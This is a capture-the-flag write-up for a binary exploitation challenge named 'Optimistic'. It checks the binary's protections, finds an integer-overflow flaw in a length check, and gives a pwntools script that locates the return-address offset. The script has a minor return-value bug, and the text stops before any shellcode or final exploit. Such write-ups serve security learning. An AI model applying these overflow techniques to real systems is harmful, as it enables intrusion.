# Optimistic
> Write-up author: jon-brandy
## DESCRIPTION:
Are you ready to feel positive?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given, then check the type of file we got.

> RESULT - 64 BIT BINARY FILE - NOT STRIPPED

![image](https://user-images.githubusercontent.com/70703371/210699697-7c4031c0-514c-4ebb-9255-b381fd9978b4.png)


2. Now check the binary's protection.

> RESULT - NO CANARY FOUND (can lead to bufferoverflow) - NX DISABLED (Can inject shellcode)

![image](https://user-images.githubusercontent.com/70703371/210699746-4f8d9148-e1a7-4ff9-bbb0-9e24bcb1908d.png)


3. Let's run the binary then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210699840-b6c4a59c-e4ea-4f03-b480-ecc17dbaa25a.png)


![image](https://user-images.githubusercontent.com/70703371/210699934-da4c8ea2-1eee-4028-ae31-19bd499b8519.png)


4. Hmm.. Let's decompile the binary and analyze the `main()` function.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/210700095-aabbf8c3-c55f-4d37-b5d8-a7298735b4fe.png)


5. Seems like we need to find the offset of our stack pointer. Not only that now we know why the binary skipped the age prompt, it's because the email variable only accepts 8 characters.

![image](https://user-images.githubusercontent.com/70703371/210700522-b68eec46-47af-4878-9817-f5673b7a0de4.png)


![image](https://user-images.githubusercontent.com/70703371/210701868-099b344f-17eb-43c8-a812-7940fb416717.png)


6. The vuln here, `local_84` is an unsigned int, then converted to int and compared to another value. This could lead to **Interger Overflow**.

![image](https://user-images.githubusercontent.com/70703371/210701107-cc6dda28-e407-42d1-a1d9-06c7fae999d1.png)


![image](https://user-images.githubusercontent.com/70703371/210701129-27c9cf30-6bf7-48e1-ae97-9c7c32fa8944.png)


> QUICK INFO

![image](https://user-images.githubusercontent.com/70703371/210701790-af97a0c4-1635-41eb-a62c-3dc99cfe4d3e.png)


7. So let's run the binary in gbd.

> At this point, we know the unsigned int is ranged from 0 - 4,294,967,295, let's input `1` as the length.

![image](https://user-images.githubusercontent.com/70703371/210702097-59de7283-a312-4b67-9511-acbba2c672c1.png)


![image](https://user-images.githubusercontent.com/70703371/210702154-71e0d74c-7bb8-40ad-99b4-7597463d1476.png)


8. Hmm.. Confused why it's terminated, because it must only validating if the length is above 64.

![image](https://user-images.githubusercontent.com/70703371/210702300-93800603-883c-4577-b091-bdf11d2f3cc4.png)


9. Let's run the binary without gdb then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210703200-fd995d5f-a764-4271-b2ca-10b80c5b0538.png)


10. Got segmentation fault!
11. Hmm.. let's try to get the EIP/RIP offset with pwntools then.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return cyclic

sh = start()
pattern = cyclic(1024)
offset = getOffset(pattern)
```

> OUTPUT - 104

![image](https://user-images.githubusercontent.com/70703371/210704786-ff573efc-ced4-4df9-bd42-99745b260899.png)







